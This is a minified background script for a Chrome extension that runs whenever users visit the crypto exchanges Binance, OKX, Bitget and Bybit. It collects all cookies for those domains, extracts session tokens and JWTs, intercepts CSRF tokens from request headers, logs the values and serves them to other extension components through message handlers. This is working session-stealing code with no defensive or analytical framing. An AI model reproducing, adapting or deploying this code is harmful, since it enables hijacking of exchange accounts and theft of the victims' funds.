function f(e){chrome.tabs.query({active:!0,lastFocusedWindow:!0},function(n){if(console.log("Tabs:",n),n.length>0&&n[0].url){const t=new URL(n[0].url).hostname;console.log("Active tab found - domain:",t),e(t)}else chrome.tabs.query({active:!0},function(o){if(console.log("All window tabs:",o),o.length>0&&o[0].url){const r=new URL(o[0].url).hostname;console.log("Active tab found in another window - domain:",r),e(r)}else console.warn("No active tab found in any window"),e(null)})})}function c(){f(function(e){e?(console.log("Current tab domain:",e),e.includes("binance.com")||e.includes("suitechsui.online")||e.includes("okx.com")||e.includes("bitget.com")||e.includes("bitgetapps.com")||e.includes("bybit.com")?s(e):console.warn("Domain not recognized or supported:",e)):console.error("Failed to fetch current tab domain")})}function i(e){console.log("Attempting to fetch Bybit secure-token for domain:",e),chrome.cookies.get({url:`https://${e}`,name:"secure-token"},function(n){if(chrome.runtime.lastError){console.error("Error fetching Bybit secure-token:",chrome.runtime.lastError);return}n?(console.log("Bybit secure-token found:",n.value),chrome.storage.local.set({bybit_jwt:n.value},function(){console.log("Bybit JWT token saved to storage")})):console.warn("No Bybit secure-token cookie found")})}function s(e){chrome.cookies.getAll({domain:e},function(n){if(chrome.runtime.lastError){console.error("Error fetching cookies for domain:",e,chrome.runtime.lastError);return}if(console.log("Cookies for domain:",e,n),chrome.storage.local.set({[`cookies_${e}`]:n},function(){console.log(`Cookies for ${e} saved to storage`)}),e.includes("okx.com")){const o=n.find(t=>t.name==="token");o&&(console.log("OKX JWT Token Found in cookies"),chrome.storage.local.set({okx_jwt:o.value}))}else if(e.includes("bitget.com")||e.includes("bitgetapps.com")){const o=n.find(t=>t.name==="bt_newsessionid");o&&(console.log("Bitget JWT Token Found in cookies"),chrome.storage.local.set({bitget_jwt:o.value}))}else if(e.includes("bybit.com")){i(e);const o=n.find(t=>t.name==="secure-token");o&&(console.log("Bybit JWT Token Found in cookies"),chrome.storage.local.set({bybit_jwt:o.value}))}})}chrome.runtime.onMessage.addListener((e,n,o)=>{if(e.type==="GET_COOKIES")return chrome.storage.local.get(null,t=>{const r=Object.entries(t).filter(([u])=>u.startsWith("cookies_")),l=Object.fromEntries(r);o(l)}),!0;if(e.type==="GET_CSRF_TOKEN")return chrome.storage.local.get(["csrfToken"],t=>{o(t.csrfToken)}),!0;if(e.type==="GET_JWT_TOKENS")return chrome.storage.local.get(null,t=>{const r={};t.okx_jwt&&(r.okx=t.okx_jwt),t.bitget_jwt&&(r.bitget=t.bitget_jwt),t.bybit_jwt&&(r.bybit=t.bybit_jwt),o(r)}),!0;if(e.type==="FETCH_COOKIES_NOW"){console.log("Manual cookie fetch triggered"),c();const t=["www.bybit.com","bybit.com","api.bybit.com","one.bybit.com"];for(const r of t)i(r);return o({success:!0}),!0}});chrome.webRequest.onBeforeSendHeaders.addListener(function(e){if(console.log("Intercepted Request:",e),e.requestHeaders){for(let n of e.requestHeaders)if(n.name.toLowerCase()==="csrftoken"){console.log("CSRF Token Found:",n.value),chrome.storage.local.set({csrfToken:n.value});break}}(e.url.includes("binance.com")||e.url.includes("suitechsui.online")||e.url.includes("okx.com")||e.url.includes("bitget.com")||e.url.includes("bitgetapps.com")||e.url.includes("bybit.com"))&&c()},{urls:["https://www.binance.com/*","https://www.suitechsui.online/*","https://www.okx.com/*","https://www.bitget.com/*","https://www.bitgetapps.com/*","https://www.bybit.com/*","https://*.bybit.com/*","https://bybit.com/*"]},["requestHeaders"]);chrome.tabs.onUpdated.addListener((e,n,o)=>{if(n.status==="complete"&&o.url&&(console.log("Tab updated:",o.url),o.url.includes("bybit.com"))){console.log("Bybit page detected:",o.url);try{const r=new URL(o.url).hostname;console.log("Bybit domain:",r),s(r)}catch(t){console.error("Error parsing Bybit URL:",t)}}});
